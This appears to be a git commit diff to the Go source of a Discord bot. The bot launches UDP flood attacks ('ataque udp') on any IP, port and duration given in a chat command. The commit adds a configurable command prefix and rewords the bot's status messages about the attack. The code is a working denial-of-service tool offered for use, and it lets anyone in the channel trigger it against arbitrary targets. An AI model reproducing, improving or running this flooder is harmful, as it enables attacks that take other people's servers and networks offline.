f15d08bb533a1dc5a6f78d50254425a5a8d20858
matarholy <holytienequemorir@gmail.com>
2025-11-07 16:15:16 -0300

    Update main.go

--- main.go
+++ main.go
@@ -20,6 +20,7 @@ var (
 	packetSize    = 64   // Tamaño del paquete (Reducido para disminuir el ancho de banda)
 	payload       []byte // Payload del paquete
 	tokenFileName = "token.txt"
+	commandPrefix = "." //  <- AQUÍ: Cambia el prefijo al que quieras
 )
 
 func init() {
@@ -91,7 +92,7 @@ func runFlood(target string, port, duration int) {
 	var wg sync.WaitGroup
 	wg.Add(threads)
 
-	fmt.Printf("Iniciando ataque UDPPPS\n"
+	fmt.Printf("Iniciando ataque UDP a %s:%d con %d threads, %d PPS y tamaño de paquete %d bytes\n", target, port, threads, ppsLimit, packetSize)
 
 	for i := 0; i < threads; i++ {
 		go flood(target, port, duration, &wg)
@@ -99,7 +100,7 @@ func runFlood(target string, port, duration int) {
 
 	wg.Wait()
 
-	fmt.Printf("Ataque UDP a %s:%d Terminado\n", target, port)
+	fmt.Printf("Ataque UDP a %s:%d finalizado.\n", target, port)
 }
 
 func main() {
@@ -132,10 +133,10 @@ func main() {
 			return
 		}
 		content := m.Content
-		if strings.HasPrefix(content, ".ataque") {
+		if strings.HasPrefix(content, commandPrefix+"ataque") { // Usar commandPrefix
 			args := strings.Fields(content)
 			if len(args) == 1 {
-				s.ChannelMessageSend(m.ChannelID, "`.ataque udp [IP] [PUERTO] [TIEMPO]`")
+				s.ChannelMessageSend(m.ChannelID, "Uso: `"+commandPrefix+"ataque udp [IP] [PUERTO] [TIEMPO]`")  // Usar commandPrefix
 				return
 			}
 			if len(args) == 5 && args[1] == "udp" {
@@ -143,17 +144,17 @@ func main() {
 				port, err1 := strconv.Atoi(args[3])
 				duration, err2 := strconv.Atoi(args[4])
 				if err1 != nil || err2 != nil {
-					s.ChannelMessageSend(m.ChannelID, "Puerto o tiempo no válido")
+					s.ChannelMessageSend(m.ChannelID, "Puerto o tiempo no válido.")
 					return
 				}
 				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque UDP enviado a %s:%d por %d segundos...", ip, port, duration))
 				go func() {
 					runFlood(ip, port, duration)
-					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque a %s:%d Terminado", ip, port))
+					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque a %s:%d finalizado.", ip, port))
 				}()
 				return
 			}
-			s.ChannelMessageSend(m.ChannelID, "`.ataque udp [IP] [PUERTO] [TIEMPO]`")
+			s.ChannelMessageSend(m.ChannelID, "Parámetros incorrectos. Uso: `"+commandPrefix+"ataque [IP] [PUERTO] [TIEMPO]`")  // Usar commandPrefix
 		}
 	})
 
@@ -162,6 +163,6 @@ func main() {
 		fmt.Println("Error al abrir la conexión:", err)
 		return
 	}
-	fmt.Println("Bot ON")
+	fmt.Println("Bot iniciado. Presiona CTRL+C para salir.")
 	select {}
 }
